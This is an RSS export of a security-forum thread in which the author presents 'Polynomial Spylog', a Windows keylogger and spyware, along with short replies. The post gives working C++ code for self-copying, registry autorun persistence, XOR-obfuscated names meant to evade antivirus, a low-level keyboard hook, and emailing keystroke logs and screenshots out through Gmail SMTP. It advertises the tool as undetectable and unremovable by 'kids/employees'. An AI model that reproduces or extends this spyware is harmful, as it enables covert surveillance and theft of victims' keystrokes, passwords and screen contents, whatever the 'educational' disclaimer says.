@@ -1,0 +1,582 @@
+<?xml version="1.0" encoding="UTF-8" ?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
+  <channel>
+    <title>Writing My first SpyWare for learning C/C++</title>
+    <link>https://0x00sec.org/t/writing-my-first-spyware-for-learning-c-c/32521</link>
+    <description>Hi All,
+I have created my first ever Spyware in C/C++ (I have named it Polynomial Spylog) . I have created this as a project to learn more C/C++. My intention is not to use this for malicious purposes but just for learning purposes. 
+Although I already have good knowledge of both of these languages but I mostly wrote algorithms and data structures implementation programs in these languages (Basically I mostly write C/C++ codes in competitive programming).
+But, I wanted to implement something that will work in real time. So I decided to create this project.
+
+Note:- 
+1. This Spyware will work only in Windows OS. 
+2. All major Function names and registry names are XOR encoded to avoid AV static detection.
+3. To decode encoded names, use &quot;DecryptXOR&quot; Function provided along with 4 as a &quot;Key&quot;.
+
+**DISCLAIMER : **
+**OUR TOOLS ARE FOR EDUCATIONAL PURPOSES ONLY. DON&#39;T USE THEM FOR ILLEGAL ACTIVITIES. YOU ARE THE ONLY RESPONSABLE FOR YOUR ACTIONS! OUR TOOLS ARE OPEN SOURCE WITH NO WARRANTY AND AS ARE.**
+
+**FEATURES OF POLYNOMIAL SPYLOG**
+. **Discrete/Tamper Proof :**By design, Advance Keylogger is undetectable and thus cannot be tampered with or removed by kids/employees .
+
+. **Keystrokes Typed:** See every keystroke typed even if it is deleted. This keystroke logger feature provides a reader-friendly version of all keystrokes logged along with the raw keylogging activity so you can see every detail.
+
+. **Continuous Screenshots:** will Capture desktop screen-shots after a given 7 seconds (u are free to change time interval according to requirements).
+
+. **Email Sending:** Screenshot and keylogger Logfile which contain sensitive user information send to registered email (Gmail only) (Mobile/Web/System). Script to send email is also written in C++.
+
+. **AutoStart :** Keylogger has functionality to auto execute on system bootup. It Insert entry on system start-up program when it is running.
+
+. **AutoCopy :** Keylogger has functionality to auto copy in %appdata%/roaming/Microsoft/CLR (The directory will be created at the time of first time execution).
+
+CODE EXPLAINATION (I will only explain main functions):- 
+
+1. **Function to automatically copy Exe file to %app% folder.**
+
+```
+void AutoCopy() {
+
+	userlc = IO::GetOurPath(true);//Creating directory
+	string f_path = userlc;
+	string f_name = f_path;
+	char encrName[] = &quot;wrglkwp*a|a&quot;; //XOR encoded Exe name. 
+	DecryptXOR((char*)encrName, strlen(encrName), encryption_key);
+	f_name += string(encrName);//file name
+	char my_name[260];
+	GetModuleFileNameA(GetModuleHandle(0), my_name, 260);//name of running process
+	string f_my = my_name;
+	CreateDirectoryA(f_path.c_str(), NULL);
+	CopyFileA(f_my.c_str(), f_name.c_str(), FALSE);
+
+}
+```
+
+2. **Function for autorun.**
+This is easy function do I will not explain the whole function code here. This function is just writing Exe file path to registry key to register it for auto start. 
+I will only explain function pointer names used in this function.
+pRgOpn, pRgSet and pRgClose are registry key function pointers. All Functions are from &quot;Advapi32.dll&quot; Library.
+I have used function pointers to call them directly from DLL to implement runtime function binding (again, Because of AV issues).
+
+**Function pointer for RegOpenKeyExW:-** 
+
+
+```
+typedef LSTATUS(__stdcall* pRgOpn)(
+	IN           HKEY,
+	IN			 LPCWSTR,
+	IN           DWORD,
+	IN           REGSAM,
+	OUT          PHKEY
+	);
+```
+
+**Function  pointer for RegSetValueExA:-**
+
+
+```
+typedef LSTATUS(__stdcall* pRgSet)(
+	IN           HKEY,
+	IN          LPCSTR,
+	DWORD      Reserved,
+	IN           DWORD,
+	IN           const BYTE*,
+	IN           DWORD
+	);
+```
+
+**Function  pointer for RegCloseKey:-**
+
+
+```
+typedef LSTATUS(__stdcall* pRgClose)(
+	IN           HKEY
+	);
+```
+
+3. **Creating hook procedure to intercept Key board events.**
+
+
+```
+HHOOK eHook = NULL;//The is a handle to hook variable
+
+static bool InstallHook() {
+
+    /*
+    A hook is a mechanism by which an application can intercept events, such as messages, mouse actions, and keystrokes.
+    A function that intercepts a particular type of event is known as a hook procedure.
+    A hook procedure can act on each event it receives, and then modify or discard the event.
+    */
+
+    Helper::WriteAppLog(&quot;Hook started... Timer started&quot;);
+    eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)OurKeyboardProc, GetModuleHandle(NULL), 0);
+    return eHook == NULL;
+    /*WH_KEYBOARD :- we use Keyboard hook, LL means Low level
+    OurKeyboardProc = Procedure invoked by the hook system when every time user pressed the key on keyboard
+    we are converting this because SetWindowsHookEx accept handle to hook procedure
+    */
+}
+```
+
+Key board Hook Procedure. I have explained most of the things in code comments.
+
+```
+
+LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam) {//This function will be called everytime a key is pressed on keyboard
+    Helper::WriteAppLog(&quot; In Keyboard Proc Func&quot;);
+    if (nCode &lt; 0) {
+        CallNextHookEx(eHook, nCode, wparam, lparam);
+    }
+
+    KBDLLHOOKSTRUCT* kbs = (KBDLLHOOKSTRUCT*)lparam;//KBDLLHOOKSTRUCT have to see on internet
+
+    if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN) {//This is just pressing the key and holding it..not pressing the key and releasing the key
+        keylog += Keys::KEYS[kbs-&gt;vkCode].Name;
+        if (kbs-&gt;vkCode == VK_RETURN) {
+            keylog += &#39;\n&#39;;
+        }
+    }
+    else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP) {//This is for that keys are released after pressing
+       //we are only interested in releasing of special keys like shift
+       //we want to store like [shift(pressed)][a][b][/shift(released)]
+       // so we will know what letters was pressed while key shift was pressed
+        DWORD key = kbs-&gt;vkCode;
+        if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL || key == VK_SHIFT
+            || key == VK_LSHIFT || key == VK_RSHIFT || key == VK_MENU || key == VK_LMENU
+            || key == VK_RMENU || key == VK_CAPITAL || key == VK_NUMLOCK || key == VK_LWIN || key == VK_RWIN) {
+            std::string KeyName = Keys::KEYS[kbs-&gt;vkCode].Name;
+            KeyName.insert(1, &quot;/&quot;);//appending back slash to represent release of key
+            keylog += KeyName;
+        }
+    }
+    std::string last_file_name = IO::Writelog(keylog); //Writing Actual Key Logs to file.
+    //keyLogsAll += keylog;
+    keylog = &quot;&quot;;
+    return CallNextHookEx(eHook, nCode, wparam, lparam);
+
+}
+```
+
+4. **Function  to Send Mail after specified interval time.**
+This is a large Function  but this is an easy Functions. I will only explain main parts from this Function .
+Please let me know in comments if anyone found something not understandable in this function.
+
+```
+
+std::string txtkeyLogFile = std::string(LOG_FILE); //Getting Log file name with path.
+std::string attachs = IO::GetOurPath(true) + last_file + &quot;::&quot; + fullPathOfImage1; // making attachment string by appending attachments paths
+
+TCHAR txtFileNameToAttach[MAX_PATH];
+_tcscpy_s(txtFileNameToAttach, CA2T(txtkeyLogFile.c_str()));
+//ZipAdd Function  accepts TCHAR parameter, so converting Log file path string to TCHAR and copying attachments string to TCHAR variable.
+ZipAdd(hz, txtFileNameToAttach, txtFileNameToAttach); //Adding Log File in Zip File.
+
+//Adding all images from imgFileNames vector to Zip File
+for (long I = 0; I &lt; imgFileNames.size(); i++) {
+	TCHAR imgFileToAttach[MAX_PATH];
+	_tcscpy_s(imgFileToAttach, CA2T(imgFileNames[i].c_str()));
+	ZipAdd(hz, imgFileToAttach, imgFileToAttach);
+}
+
+//API Function  to send mail with attachments using CURL (will explain this function later) .
+curlSendMail::sendFinalmail(_TO, _FROM, username,  _PASSWORD, zipfileWithPath, std::string(ZIP_FILE));
+
+if (dwFileSize &gt;= 1000000) { //clear the file if file size become greater than 1 MB
+	ofstream myfile;
+	myfile.open(last_file);
+	if (myfile.is_open()) {
+		myfile &lt;&lt; &quot;&quot;; //Emptying the file
+		oldSize = 0;
+		myfile.close();
+	}
+}
+```
+
+5. **Function to Capture screen shots.**
+All the functionality of Screenshot capturing is written in &quot;Screenshots.h&quot; file. 
+Function is little large so I am not explaining it here. However, it is using Windows API GDI and DC to create Bitmaps of screen pixels and save them in app folder.
+
+6. **Function to send mail with attachment**
+There are Couple of functions I have written for this purpose. However, I will explain only main function here.
+
+
+```
+namespace curlSendMail {
+    int sendFinalmail(std::string _ToEMail, std::string _FromEMail, std::string&amp; _loginUserName, std::string&amp; _loginPassword, 
+        std::string&amp; _FileNameWithPath, const std::string&amp; _fileNameWithoutPath = &quot;attachement.zip&quot;)
+    {
+        TO = std::move(_ToEMail);
+        FROM = std::move(_FromEMail);
+        FILENAME = std::move(_FileNameWithPath);
+        char currDir[MAX_PATH_SZ];
+        GetCurrentDirectoryA(MAX_PATH_SZ, currDir);
+
+        std::string FULL_FILENAME = FILENAME;
+
+        std::string fullFilePath = std::string(currDir) + &quot;\\&quot; + _fileNameWithoutPath;
+
+        CopyFileA(FULL_FILENAME.c_str(), fullFilePath.c_str(), FALSE);
+
+        CURL* curl;
+        CURLcode res = CURLE_OK;
+        struct curl_slist* recipients = NULL;
+        struct fileBuf_upload_status file_upload_ctx;
+        size_t file_size(0);
+
+        file_upload_ctx.lines_read = 0;
+
+
+        curl = curl_easy_init();
+        file_size = read_file();
+        if (curl)
+        {
+            curl_easy_setopt(curl, CURLOPT_USERNAME, _loginUserName.c_str()); //setting Gmail username
+            curl_easy_setopt(curl, CURLOPT_PASSWORD, _loginPassword.c_str()); //settings Gmail password
+            curl_easy_setopt(curl, CURLOPT_URL, &quot;smtp://smtp.gmail.com:587&quot;); //Gmail&#39;s smtp address
+            curl_easy_setopt(curl, CURLOPT_USE_SSL, (long)CURLUSESSL_ALL);
+            //curl_easy_setopt(curl, CURLOPT_CAINFO, &quot;google.pem&quot;);
+            curl_easy_setopt(curl, CURLOPT_MAIL_FROM, FROM.c_str()); //Sender email address
+            recipients = curl_slist_append(recipients, TO.c_str()); 
+            curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients); //Recipient Email address
+            curl_easy_setopt(curl, CURLOPT_INFILESIZE, file_size); 
+            curl_easy_setopt(curl, CURLOPT_READFUNCTION, fileBuf_source);
+            curl_easy_setopt(curl, CURLOPT_READDATA, &amp;file_upload_ctx);
+            curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L); //flag to indicate attachment
+            curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L); //Don’t display Curl Connection data Change 1L to 0
+
+            res = curl_easy_perform(curl);
+
+            if (res != CURLE_OK)
+                fprintf(stderr, &quot;curl_easy_perform() failed: %s\n&quot;, curl_easy_strerror(res));
+            curl_slist_free_all(recipients);
+            curl_easy_cleanup(curl);
+        }
+        delete[] fileBuf;
+        //std::cin.get();
+        return (int)res;
+    }
+}
+```
+
+Thats it. However, There are couple of other functions also that I have not mentioned here. I have implemented multithreading so that both screenshot capturing and key log saving tasks can be executed parallelly.
+Please note that this is my first technical writeup so apologies for any mistakes. Please do mention in &quot;reply&quot; any improvements and suggestions. I will take care of them in my future writeups.
+Further, Please point out any mistakes or suggestions or any improvements in this project. I will rectify them. 
+Please feel free to contribute to this project. I have mentioned GitHub link of this project (my GitHub account is with my real name LOL).
+Please don&#39;t use this tool for malicious activities. I am not responsible for any of the activities performed by anyone using this tool.
+
+Github Link:- https://github.com/ravijotsingh58/polynomial-spylog
+
+And Always Love C and C++
+*Polynomial*</description>
+    
+    <lastBuildDate>Wed, 12 Apr 2023 09:20:36 +0000</lastBuildDate>
+    <category>Programming</category>
+    <atom:link href="https://0x00sec.org/t/writing-my-first-spyware-for-learning-c-c/32521.rss" rel="self" type="application/rss+xml" />
+      <item>
+        <title>Writing My first SpyWare for learning C/C++</title>
+        <dc:creator><![CDATA[system]]></dc:creator>
+        <description><![CDATA[
+            <p>This topic was automatically closed after 121 days. New replies are no longer allowed.</p>
+          <p><a href="https://0x00sec.org/t/writing-my-first-spyware-for-learning-c-c/32521/5">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/writing-my-first-spyware-for-learning-c-c/32521/5</link>
+        <pubDate>Mon, 17 Apr 2023 06:18:47 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-32521-5</guid>
+        <source url="https://0x00sec.org/t/writing-my-first-spyware-for-learning-c-c/32521.rss">Writing My first SpyWare for learning C/C++</source>
+      </item>
+      <item>
+        <title>Writing My first SpyWare for learning C/C++</title>
+        <dc:creator><![CDATA[whatsacomputer]]></dc:creator>
+        <description><![CDATA[
+            <p>Apologies if the question is beginner but<br>
+in helper.h we have a comment<br>
+<code>// time starts from 1970 in UNIX</code><br>
+yet the code is</p>
+<pre><code class="lang-auto">y = 1900 + info-&gt;tm_year;
+</code></pre>
+<p>I think you got a typo there also a typo on keyhook.h line 121 comment</p>
+<p>I love how much this is commented by the way!<br>
+As someone who is just learning this is way more interesting with lots of descriptive commenting<br>
+Good work!</p>
+          <p><a href="https://0x00sec.org/t/writing-my-first-spyware-for-learning-c-c/32521/4">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/writing-my-first-spyware-for-learning-c-c/32521/4</link>
+        <pubDate>Wed, 12 Apr 2023 08:49:19 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-32521-4</guid>
+        <source url="https://0x00sec.org/t/writing-my-first-spyware-for-learning-c-c/32521.rss">Writing My first SpyWare for learning C/C++</source>
+      </item>
+      <item>
+        <title>Writing My first SpyWare for learning C/C++</title>
+        <dc:creator><![CDATA[runner]]></dc:creator>
+        <description><![CDATA[
+            <p>I also want to know this, looks great.</p>
+          <p><a href="https://0x00sec.org/t/writing-my-first-spyware-for-learning-c-c/32521/3">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/writing-my-first-spyware-for-learning-c-c/32521/3</link>
+        <pubDate>Fri, 31 Mar 2023 17:36:50 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-32521-3</guid>
+        <source url="https://0x00sec.org/t/writing-my-first-spyware-for-learning-c-c/32521.rss">Writing My first SpyWare for learning C/C++</source>
+      </item>
+      <item>
+        <title>Writing My first SpyWare for learning C/C++</title>
+        <dc:creator><![CDATA[4lek5]]></dc:creator>
+        <description><![CDATA[
+            <p>How long have you been learning C++? And what resources did you use to learn?</p>
+          <p><a href="https://0x00sec.org/t/writing-my-first-spyware-for-learning-c-c/32521/2">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/writing-my-first-spyware-for-learning-c-c/32521/2</link>
+        <pubDate>Tue, 24 Jan 2023 04:42:13 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-32521-2</guid>
+        <source url="https://0x00sec.org/t/writing-my-first-spyware-for-learning-c-c/32521.rss">Writing My first SpyWare for learning C/C++</source>
+      </item>
+      <item>
+        <title>Writing My first SpyWare for learning C/C++</title>
+        <dc:creator><![CDATA[landi58]]></dc:creator>
+        <description><![CDATA[
+            <p>Hi All,<br>
+I have created my first ever Spyware in C/C++ (I have named it Polynomial Spylog) . I have created this as a project to learn more C/C++. My intention is not to use this for malicious purposes but just for learning purposes.<br>
+Although I already have good knowledge of both of these languages but I mostly wrote algorithms and data structures implementation programs in these languages (Basically I mostly write C/C++ codes in competitive programming).<br>
+But, I wanted to implement something that will work in real time. So I decided to create this project.</p>
+<p>Note:-</p>
+<ol>
+<li>This Spyware will work only in Windows OS.</li>
+<li>All major Function names and registry names are XOR encoded to avoid AV static detection.</li>
+<li>To decode encoded names, use “DecryptXOR” Function provided along with 4 as a “Key”.</li>
+</ol>
+<p>**DISCLAIMER : **<br>
+<strong>OUR TOOLS ARE FOR EDUCATIONAL PURPOSES ONLY. DON’T USE THEM FOR ILLEGAL ACTIVITIES. YOU ARE THE ONLY RESPONSABLE FOR YOUR ACTIONS! OUR TOOLS ARE OPEN SOURCE WITH NO WARRANTY AND AS ARE.</strong></p>
+<p><strong>FEATURES OF POLYNOMIAL SPYLOG</strong><br>
+. **Discrete/Tamper Proof :**By design, Advance Keylogger is undetectable and thus cannot be tampered with or removed by kids/employees .</p>
+<p>. <strong>Keystrokes Typed:</strong> See every keystroke typed even if it is deleted. This keystroke logger feature provides a reader-friendly version of all keystrokes logged along with the raw keylogging activity so you can see every detail.</p>
+<p>. <strong>Continuous Screenshots:</strong> will Capture desktop screen-shots after a given 7 seconds (u are free to change time interval according to requirements).</p>
+<p>. <strong>Email Sending:</strong> Screenshot and keylogger Logfile which contain sensitive user information send to registered email (Gmail only) (Mobile/Web/System). Script to send email is also written in C++.</p>
+<p>. <strong>AutoStart :</strong> Keylogger has functionality to auto execute on system bootup. It Insert entry on system start-up program when it is running.</p>
+<p>. <strong>AutoCopy :</strong> Keylogger has functionality to auto copy in %appdata%/roaming/Microsoft/CLR (The directory will be created at the time of first time execution).</p>
+<p>CODE EXPLAINATION (I will only explain main functions):-</p>
+<ol>
+<li><strong>Function to automatically copy Exe file to %app% folder.</strong></li>
+</ol>
+<pre><code class="lang-auto">void AutoCopy() {
+
+	userlc = IO::GetOurPath(true);//Creating directory
+	string f_path = userlc;
+	string f_name = f_path;
+	char encrName[] = "wrglkwp*a|a"; //XOR encoded Exe name. 
+	DecryptXOR((char*)encrName, strlen(encrName), encryption_key);
+	f_name += string(encrName);//file name
+	char my_name[260];
+	GetModuleFileNameA(GetModuleHandle(0), my_name, 260);//name of running process
+	string f_my = my_name;
+	CreateDirectoryA(f_path.c_str(), NULL);
+	CopyFileA(f_my.c_str(), f_name.c_str(), FALSE);
+
+}
+</code></pre>
+<ol start="2">
+<li>
+<strong>Function for autorun.</strong><br>
+This is easy function do I will not explain the whole function code here. This function is just writing Exe file path to registry key to register it for auto start.<br>
+I will only explain function pointer names used in this function.<br>
+pRgOpn, pRgSet and pRgClose are registry key function pointers. All Functions are from “Advapi32.dll” Library.<br>
+I have used function pointers to call them directly from DLL to implement runtime function binding (again, Because of AV issues).</li>
+</ol>
+<p><strong>Function pointer for RegOpenKeyExW:-</strong></p>
+<pre><code class="lang-auto">typedef LSTATUS(__stdcall* pRgOpn)(
+	IN           HKEY,
+	IN			 LPCWSTR,
+	IN           DWORD,
+	IN           REGSAM,
+	OUT          PHKEY
+	);
+</code></pre>
+<p><strong>Function  pointer for RegSetValueExA:-</strong></p>
+<pre><code class="lang-auto">typedef LSTATUS(__stdcall* pRgSet)(
+	IN           HKEY,
+	IN          LPCSTR,
+	DWORD      Reserved,
+	IN           DWORD,
+	IN           const BYTE*,
+	IN           DWORD
+	);
+</code></pre>
+<p><strong>Function  pointer for RegCloseKey:-</strong></p>
+<pre><code class="lang-auto">typedef LSTATUS(__stdcall* pRgClose)(
+	IN           HKEY
+	);
+</code></pre>
+<ol start="3">
+<li><strong>Creating hook procedure to intercept Key board events.</strong></li>
+</ol>
+<pre><code class="lang-auto">HHOOK eHook = NULL;//The is a handle to hook variable
+
+static bool InstallHook() {
+
+    /*
+    A hook is a mechanism by which an application can intercept events, such as messages, mouse actions, and keystrokes.
+    A function that intercepts a particular type of event is known as a hook procedure.
+    A hook procedure can act on each event it receives, and then modify or discard the event.
+    */
+
+    Helper::WriteAppLog("Hook started... Timer started");
+    eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)OurKeyboardProc, GetModuleHandle(NULL), 0);
+    return eHook == NULL;
+    /*WH_KEYBOARD :- we use Keyboard hook, LL means Low level
+    OurKeyboardProc = Procedure invoked by the hook system when every time user pressed the key on keyboard
+    we are converting this because SetWindowsHookEx accept handle to hook procedure
+    */
+}
+</code></pre>
+<p>Key board Hook Procedure. I have explained most of the things in code comments.</p>
+<pre><code class="lang-auto">
+LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam) {//This function will be called everytime a key is pressed on keyboard
+    Helper::WriteAppLog(" In Keyboard Proc Func");
+    if (nCode &lt; 0) {
+        CallNextHookEx(eHook, nCode, wparam, lparam);
+    }
+
+    KBDLLHOOKSTRUCT* kbs = (KBDLLHOOKSTRUCT*)lparam;//KBDLLHOOKSTRUCT have to see on internet
+
+    if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN) {//This is just pressing the key and holding it..not pressing the key and releasing the key
+        keylog += Keys::KEYS[kbs-&gt;vkCode].Name;
+        if (kbs-&gt;vkCode == VK_RETURN) {
+            keylog += '\n';
+        }
+    }
+    else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP) {//This is for that keys are released after pressing
+       //we are only interested in releasing of special keys like shift
+       //we want to store like [shift(pressed)][a][b][/shift(released)]
+       // so we will know what letters was pressed while key shift was pressed
+        DWORD key = kbs-&gt;vkCode;
+        if (key == VK_CONTROL || key == VK_LCONTROL || key == VK_RCONTROL || key == VK_SHIFT
+            || key == VK_LSHIFT || key == VK_RSHIFT || key == VK_MENU || key == VK_LMENU
+            || key == VK_RMENU || key == VK_CAPITAL || key == VK_NUMLOCK || key == VK_LWIN || key == VK_RWIN) {
+            std::string KeyName = Keys::KEYS[kbs-&gt;vkCode].Name;
+            KeyName.insert(1, "/");//appending back slash to represent release of key
+            keylog += KeyName;
+        }
+    }
+    std::string last_file_name = IO::Writelog(keylog); //Writing Actual Key Logs to file.
+    //keyLogsAll += keylog;
+    keylog = "";
+    return CallNextHookEx(eHook, nCode, wparam, lparam);
+
+}
+</code></pre>
+<ol start="4">
+<li>
+<strong>Function  to Send Mail after specified interval time.</strong><br>
+This is a large Function  but this is an easy Functions. I will only explain main parts from this Function .<br>
+Please let me know in comments if anyone found something not understandable in this function.</li>
+</ol>
+<pre><code class="lang-auto">
+std::string txtkeyLogFile = std::string(LOG_FILE); //Getting Log file name with path.
+std::string attachs = IO::GetOurPath(true) + last_file + "::" + fullPathOfImage1; // making attachment string by appending attachments paths
+
+TCHAR txtFileNameToAttach[MAX_PATH];
+_tcscpy_s(txtFileNameToAttach, CA2T(txtkeyLogFile.c_str()));
+//ZipAdd Function  accepts TCHAR parameter, so converting Log file path string to TCHAR and copying attachments string to TCHAR variable.
+ZipAdd(hz, txtFileNameToAttach, txtFileNameToAttach); //Adding Log File in Zip File.
+
+//Adding all images from imgFileNames vector to Zip File
+for (long I = 0; I &lt; imgFileNames.size(); i++) {
+	TCHAR imgFileToAttach[MAX_PATH];
+	_tcscpy_s(imgFileToAttach, CA2T(imgFileNames[i].c_str()));
+	ZipAdd(hz, imgFileToAttach, imgFileToAttach);
+}
+
+//API Function  to send mail with attachments using CURL (will explain this function later) .
+curlSendMail::sendFinalmail(_TO, _FROM, username,  _PASSWORD, zipfileWithPath, std::string(ZIP_FILE));
+
+if (dwFileSize &gt;= 1000000) { //clear the file if file size become greater than 1 MB
+	ofstream myfile;
+	myfile.open(last_file);
+	if (myfile.is_open()) {
+		myfile &lt;&lt; ""; //Emptying the file
+		oldSize = 0;
+		myfile.close();
+	}
+}
+</code></pre>
+<ol start="5">
+<li>
+<p><strong>Function to Capture screen shots.</strong><br>
+All the functionality of Screenshot capturing is written in “Screenshots.h” file.<br>
+Function is little large so I am not explaining it here. However, it is using Windows API GDI and DC to create Bitmaps of screen pixels and save them in app folder.</p>
+</li>
+<li>
+<p><strong>Function to send mail with attachment</strong><br>
+There are Couple of functions I have written for this purpose. However, I will explain only main function here.</p>
+</li>
+</ol>
+<pre><code class="lang-auto">namespace curlSendMail {
+    int sendFinalmail(std::string _ToEMail, std::string _FromEMail, std::string&amp; _loginUserName, std::string&amp; _loginPassword, 
+        std::string&amp; _FileNameWithPath, const std::string&amp; _fileNameWithoutPath = "attachement.zip")
+    {
+        TO = std::move(_ToEMail);
+        FROM = std::move(_FromEMail);
+        FILENAME = std::move(_FileNameWithPath);
+        char currDir[MAX_PATH_SZ];
+        GetCurrentDirectoryA(MAX_PATH_SZ, currDir);
+
+        std::string FULL_FILENAME = FILENAME;
+
+        std::string fullFilePath = std::string(currDir) + "\\" + _fileNameWithoutPath;
+
+        CopyFileA(FULL_FILENAME.c_str(), fullFilePath.c_str(), FALSE);
+
+        CURL* curl;
+        CURLcode res = CURLE_OK;
+        struct curl_slist* recipients = NULL;
+        struct fileBuf_upload_status file_upload_ctx;
+        size_t file_size(0);
+
+        file_upload_ctx.lines_read = 0;
+
+
+        curl = curl_easy_init();
+        file_size = read_file();
+        if (curl)
+        {
+            curl_easy_setopt(curl, CURLOPT_USERNAME, _loginUserName.c_str()); //setting Gmail username
+            curl_easy_setopt(curl, CURLOPT_PASSWORD, _loginPassword.c_str()); //settings Gmail password
+            curl_easy_setopt(curl, CURLOPT_URL, "smtp://smtp.gmail.com:587"); //Gmail's smtp address
+            curl_easy_setopt(curl, CURLOPT_USE_SSL, (long)CURLUSESSL_ALL);
+            //curl_easy_setopt(curl, CURLOPT_CAINFO, "google.pem");
+            curl_easy_setopt(curl, CURLOPT_MAIL_FROM, FROM.c_str()); //Sender email address
+            recipients = curl_slist_append(recipients, TO.c_str()); 
+            curl_easy_setopt(curl, CURLOPT_MAIL_RCPT, recipients); //Recipient Email address
+            curl_easy_setopt(curl, CURLOPT_INFILESIZE, file_size); 
+            curl_easy_setopt(curl, CURLOPT_READFUNCTION, fileBuf_source);
+            curl_easy_setopt(curl, CURLOPT_READDATA, &amp;file_upload_ctx);
+            curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L); //flag to indicate attachment
+            curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L); //Don’t display Curl Connection data Change 1L to 0
+
+            res = curl_easy_perform(curl);
+
+            if (res != CURLE_OK)
+                fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
+            curl_slist_free_all(recipients);
+            curl_easy_cleanup(curl);
+        }
+        delete[] fileBuf;
+        //std::cin.get();
+        return (int)res;
+    }
+}
+</code></pre>
+<p>Thats it. However, There are couple of other functions also that I have not mentioned here. I have implemented multithreading so that both screenshot capturing and key log saving tasks can be executed parallelly.<br>
+Please note that this is my first technical writeup so apologies for any mistakes. Please do mention in “reply” any improvements and suggestions. I will take care of them in my future writeups.<br>
+Further, Please point out any mistakes or suggestions or any improvements in this project. I will rectify them.<br>
+Please feel free to contribute to this project. I have mentioned GitHub link of this project (my GitHub account is with my real name LOL).<br>
+Please don’t use this tool for malicious activities. I am not responsible for any of the activities performed by anyone using this tool.</p>
+<p>Github Link:- <a href="https://github.com/ravijotsingh58/polynomial-spylog" class="inline-onebox" rel="noopener nofollow ugc">GitHub - ravijotsingh58/polynomial-spylog: Keylogger is 100% invisible keylogger not only for users, but also undetectable by antivirus software. polynomial spylog Monitors all keystokes. It has a seperate process which continues capture system screenshot and send to registered gmail in given time.</a></p>
+<p>And Always Love C and C++<br>
+<em>Polynomial</em></p>
+          <p><a href="https://0x00sec.org/t/writing-my-first-spyware-for-learning-c-c/32521/1">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/writing-my-first-spyware-for-learning-c-c/32521/1</link>
+        <pubDate>Fri, 16 Dec 2022 14:18:18 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-32521-1</guid>
+        <source url="https://0x00sec.org/t/writing-my-first-spyware-for-learning-c-c/32521.rss">Writing My first SpyWare for learning C/C++</source>
+      </item>
+  </channel>
+</rss>
